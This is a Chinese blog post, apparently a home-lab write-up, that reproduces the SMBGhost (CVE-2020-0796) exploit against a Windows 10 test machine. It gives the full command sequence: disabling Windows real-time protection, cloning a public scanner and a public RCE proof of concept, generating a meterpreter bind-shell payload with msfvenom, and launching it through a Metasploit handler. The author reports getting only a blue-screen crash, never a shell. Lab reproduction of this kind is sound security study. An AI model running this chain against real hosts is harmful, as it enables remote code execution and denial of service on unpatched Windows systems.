---
title: 永恒之黑漏洞复现
date: 2023-04-21 10:10:13
categories: 技术
tags:
    - 网络安全
---

### 惭愧声明

稍微了解一点就会知道，永恒之黑是可以拿到shell的，但是因为技术能力的限制，到现在复现漏洞我也没有拿到shell，只会让靶机蓝屏重启。先把博客更了，等后续搞明白了，再来更新。

### 准备工作

首先，准备一台kali和一台运行1903版本或者1909版本的windows10。

<!-- more -->

关闭windows10的防火墙的“病毒和威胁防护设置”的实时保护功能。

在kali上准备待会要用到的工具。

1. 扫描漏洞脚本

```git
  git clone https://github.com/ollypwn/SMBGhost.git
```

有人说这个脚本不准确，有时候检测超时也会报漏洞可利用，这个脚本也不太重要，至少对于这个实验来说。

2. EXP攻击脚本

```git
  git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git
```

### 扫描漏洞

下载好漏洞扫描脚本后进入该目录，执行：

```python
  python3 scanner.py 192.168.20.135
```

"192.168.20.135"更换为自己靶机的IP。下面是效果图，显示"Vulnerable"，易受攻击的。

![漏洞扫描](../_posts/CVE-2020-0796/1.png)

### 准备payload

进入使用EXP脚本的SMBGhost_RCE_PoC目录，执行：

```bash
  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f py -o payload
```

执行之后会在SMBGhost_RCE_PoC目录下生成payload文件。接下来很重要的步骤：

1. 打开payload。

2. 打开exploit.py。

3. 将payload中“buf”字段全部替换为“USER_PAYLOAD”字段。

4. 复制替换完成的payload文件内容。

5. 粘贴到（覆盖）exploit.py文件USER_PAYLOAD区域。

![修改payload](../_posts/CVE-2020-0796/2.png)

### 开始攻击

1. 启动“美少妇”。

2. 使用模块。

3. 设置有效载荷和相关参数。

依次执行以下命令：

```bash
  msfconsole -q
  use exploit/multi/handler
  set payload windows/x64/meterpreter/bind_tcp
  set lport 4444
  set rhost 192.168.20.135
  run
```

再打开一个终端，进入SMBGhost_RCE_PoC目录，运行：

```bash
  python3 exploit.py -ip 192.168.20.135
```

![运行 exploit.py](./CVE-2020-0796/4.png)

出现这步后按下回车。

然后回到win10，发现win10蓝屏正在重启。

![win10重启](./CVE-2020-0796/5.png)

如果完成的彻底，美少妇终端会弹出meterpreter，但是很遗憾，我没有拿到靶机的shell。

![拿到shell](./CVE-2020-0796/6.png)